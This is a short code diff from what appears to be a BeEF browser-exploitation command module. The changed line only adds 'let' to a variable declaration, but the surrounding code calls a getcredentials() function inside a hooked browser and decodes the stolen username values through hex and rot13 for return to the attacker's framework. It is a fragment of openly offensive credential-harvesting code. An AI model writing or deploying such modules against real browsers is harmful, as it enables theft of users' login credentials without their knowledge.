@@ -14,7 +14,7 @@ beef.execute(function() {
 
   if (typeof getcredentials === "function") {
     setTimeout(function () {
-      creds = getcredentials();
+      let creds = getcredentials();
       var result = [];
       result.push({
         "username": rot13(hex_2_ascii(creds.split('/')[0].split('=')[1])),
